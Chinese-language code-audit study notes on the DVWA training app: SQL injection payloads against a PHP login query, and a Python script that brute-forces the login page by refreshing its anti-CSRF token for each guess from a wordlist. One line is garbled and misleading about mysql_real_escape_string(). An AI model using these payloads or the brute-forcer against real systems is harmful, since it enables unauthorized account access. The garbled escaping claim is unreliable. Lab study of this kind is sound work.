# 代码审计笔记
## sql注入：
###原始代码
``` php
	$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
```
###注入代码
```sql
admin' #
SELECT * FROM `users` WHERE user = 'admin' #' AND password = 'd41d8cd98f00b204e9800998ecf8427e';
admin' or '1' ='1
SELECT * FROM `users` WHERE user = 'admin’ or ’1=’1' AND password = 'd41d8cd98f00b204e9800998ecf8427e';
```
### php 函数处理sql 条件 mysql_real_escape_string()可以绕过注入
### 暴力破解使用Token的Python代码
```python
from bs4 import BeautifulSoup
import urllib2
header={        'Host': '192.168.153.130',
		'Cache-Control': 'max-age=0',
		'If-None-Match': "307-52156c6a290c0",
		'If-Modified-Since': 'Mon, 05 Oct 2015 07:51:07 GMT',
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36',
		'Accept': '*/*',
		'Referer': 'http://192.168.153.130/dvwa/vulnerabilities/brute/index.php',
		'Accept-Encoding': 'gzip, deflate, sdch',
		'Accept-Language': 'zh-CN,zh;q=0.8',
		'Cookie': 'security=high; PHPSESSID=5re92j36t4f2k1gvnqdf958bi2'}
requrl = "http://192.168.153.130/dvwa/vulnerabilities/brute/"

def get_token(requrl,header):
	req = urllib2.Request(url=requrl,headers=header)
	response = urllib2.urlopen(req)
	print response.getcode(),
	the_page = response.read()
	print len(the_page)
	soup = BeautifulSoup(the_page,"html.parser")
	user_token = soup.form.input.input.input.input["value"] #get the user_token
	return user_token

user_token = get_token(requrl,header)
i=0
for line in open("rkolin.txt"):
	requrl = "http://192.168.153.130/dvwa/vulnerabilities/brute/"+"?username=admin&password="+line.strip()+"&Login=Login&user_token="+user_token
	i = i+1
	print i,'admin',line.strip(),
	user_token = get_token(requrl,header)
	if (i == 10):
		break
```
